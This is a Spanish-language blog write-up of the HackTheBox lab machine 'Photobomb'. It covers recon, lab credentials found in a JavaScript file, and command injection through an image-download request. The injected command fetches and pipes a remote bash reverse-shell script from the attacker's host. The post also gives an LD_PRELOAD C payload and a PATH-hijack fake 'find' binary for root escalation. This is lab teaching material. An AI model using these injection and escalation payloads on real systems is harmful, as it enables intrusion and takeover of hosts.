---
layout      : post
title       : "Photobomb - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Photobomb-HackTheBox/Photobomb.webp
category    : [ htb ]
tags        : [ Linux ]
---

🤖En esta máquina Linux de nivel Easy encontraremos unas credenciales de acceso a un panel web de descarga de imágenes ocultas en archivo javascript, a través de burpsuite podremos obtener un reverse shell y escalaremos privilegios de 2 formas diferentes, a través del script cleanup.sh creando un falso binario y a través de LD_PRELOAD, creando el script en C🤖.

🎥Canal Writeups Youtube🎬 --> [https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ](https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ)

![](/assets/images/HTB/Photobomb-HackTheBox/photobomb2.webp)

![](/assets/images/HTB/Photobomb-HackTheBox/photobomb-rating.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)


...


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Enumeración](#enumeración).
    * [Analizando la Web](#enum-web).
3. [Explotación](#explotacion).    
    * [Burpsuite](#burpsuite).
4. [Escalada de Privilegios](#privesc). 
    * [Variable LD_PRELOAD](#preload).   
    * [Script /opt/cleanup.sh](#script)

 
...

# Reconocimiento [#](reconocimiento) {#reconocimiento}

***

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Como siempre comenzamos lanzando Whichsystem para averiguar ante que sistema operativo nos enfrentamos, recordar que Whichsytem es una utilidad desarrollada en python por S4vitar que nos permite detectar el sistema operativo de una máquina por su TTL (Time To Live).

```bash
# Windows --> TTL 128
---------------------
# Linux --> TTL 64
```

![](/assets/images/HTB/Photobomb-HackTheBox/whichsystem.webp)

Una vez sabemos que nos enfrentamos ante una máquina Linux procedo a enumerar los puertos existentes en la máquina.

![](/assets/images/HTB/Photobomb-HackTheBox/rustscan.webp)

Tenemos lo siguiente:

![](/assets/images/HTB/Photobomb-HackTheBox/nmap.webp)

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 |
| 80     | HTTP     | nginx 1.18.0 |

> Dominio --> <span style="color:red">photobomb.htb</span>

Añado el dominio al archivo <span style="color:red"> /etc/hosts</span>

# Enumeración [#](enumeración) {#enumeración}

***

## Analizando la Web [📌](#enum-web) {#enum-web}

Lanzo la utilidad Whatweb para ientificar el sitio web, sus tecnologías web, versiones, sistemas CMS... etc

![](/assets/images/HTB/Photobomb-HackTheBox/whatweb.webp)

Nos arroja la información del servidor web, servicio, versión, título... etc

Asique ahora voy a acceder al mismo para ver que tenemos.

![](/assets/images/HTB/Photobomb-HackTheBox/web.webp)

Parece una web dedicada a la venta de imágenes de alta calidad.
Además de eso nos dice que las credenciales se encuentran en mi paquete de bienvenida.
Y nos dice también que si tenemos algún problema con la impresora que contactemos con el número de soporte.

Si hacemos click sobre `click here` nos aparece un login, pero no tenemos credenciales.

Mirando el código fuente veo que hay un archivo javascript llamado photobomb.js.

Lo abro y encuentro unas credenciales.

![](/assets/images/HTB/Photobomb-HackTheBox/javascript.webp)

> <span style="color:red"> pH0t0 : b0Mb!</span>

Me autentico con las credenciales y funciona, accedo a la ruta /printer.

Dentro hay imágenes en diferentes resoluciones que podemos descargar.

![](/assets/images/HTB/Photobomb-HackTheBox/web2.webp)

# Explotación [#](explotacion) {#explotacion}

***

## Burpsuite [🔥](#burpsuite) {#burpsuite}


Se me ocurre abrir Burpsuite e interceptar la petición al hacer click en descargar la imágen.

![](/assets/images/HTB/Photobomb-HackTheBox/burp1.webp)

Tenemos la petición con el nombre de la imágen, la extensión de la imágen y sus dimensiones.

Podría intentar introducir comandos para obtener una reverse shell, asique mando la petición al repeater.

Creo una reverse shell en bash en mi máquina atacante.

![](/assets/images/HTB/Photobomb-HackTheBox/rev-bash.webp)

Lanzo un servidor de python3.

> `python3 -m http.server 8080`

Y desde el burp injecto el siguiente comando.

`curl+http://10.10.15.17:8080/rev-bash.sh+|bash+`

![](/assets/images/HTB/Photobomb-HackTheBox/burp2.webp)

Ponemos netcat en escucha en el puerto 443 y hacemos click en send.

![](/assets/images/HTB/Photobomb-HackTheBox/user.webp)

Y ya estamos dentro como el usuario Wizard y podemos leer la flag user.txt

![](/assets/images/HTB/Photobomb-HackTheBox/userflag.webp)

La shell no es muy interactiva por lo que ejecuto los siguientes comandos para poder conectarme a través de ssh y terner una shell mejor.

Genero una clave SSH con ssh-keygen

![](/assets/images/HTB/Photobomb-HackTheBox/ssh1.webp)

Cambio el nombre de la clave publica a authorized_keys

![](/assets/images/HTB/Photobomb-HackTheBox/ssh2.webp)

Me copio la clave privada a mi máquina atacante a un archivo (elc4br4.rsa)

![](/assets/images/HTB/Photobomb-HackTheBox/ssh3.webp)

Le asigno los permisos necesarios y me conecto por ssh con el rsa.

![](/assets/images/HTB/Photobomb-HackTheBox/ssh4.webp)

Ejecutamos estos comandos para tener la shell interactiva 100x100

```bash
export TERM=xterm
export SHELL=bash
```

Y ya podemos escalar privilegios.

# Escalada de Privilegios [#](privesc) {#privesc}


Primeramente como siempre enumeramos para encontrar vectores de escalada y como siempre comienzo por `sudo -l`

![](/assets/images/HTB/Photobomb-HackTheBox/privesc1.webp)

Partiendo de aquí existen 2 formas de escalar privilegios.

## Variable LD_PRELOAD [👨‍💻](#preload) {#preload}

> `LD_Preload es la variable de entorno que lista las rutas de la librerías compartidas, al igual que /etc/ld.so.preload.`

> Para poder escalar debemos crear un script en C con el siguiente contenido.

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
    void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/usr/bin/bash");
}
```

Una vez creado lo compilamos con el comando:

`gcc -fPIC -shared -o escalada.so shell.c -nostartfiles`

![](/assets/images/HTB/Photobomb-HackTheBox/compiled.webp)

Y lo subimos la máquina víctima.

Una vez lo hemos subido lo ejecutamos.

`chmod 777 escalada.so`

`sudo LD_PRELOAD=/tmp/escalada.so /opt/cleanup.sh`

![](/assets/images/HTB/Photobomb-HackTheBox/root.webp)


## Script /opt/cleanup.sh [👨‍💻](#script) {#script}

Si leemos el código del script veremos lo siguiente:

![](/assets/images/HTB/Photobomb-HackTheBox/script.webp)

Si nos fijamos bien el binario find no especifica su ruta absoluta, por lo que podríamos escalar privilegios creando un binario find falso y añadiéndole una bash en su interior, posteriormente lo exportamos al PATH de forma que al ejecutar el script cleanup.sh como root se ejecutará nuestro binario falso con el contenido de su interior.

* Creamos el falso find

![](/assets/images/HTB/Photobomb-HackTheBox/find1.webp)

* Lo exportamos al PATH.

```bash
# Asiganos los permisos al binario falso
chmod 777 find
-----------------------------------------
# Exportamos el binario al path
sudo PATH=/tmp/:$PATH /opt/cleanup.sh
```

![](/assets/images/HTB/Photobomb-HackTheBox/find2.webp)

Y ya somos root!!!

![](/assets/images/HTB/Photobomb-HackTheBox/share.webp)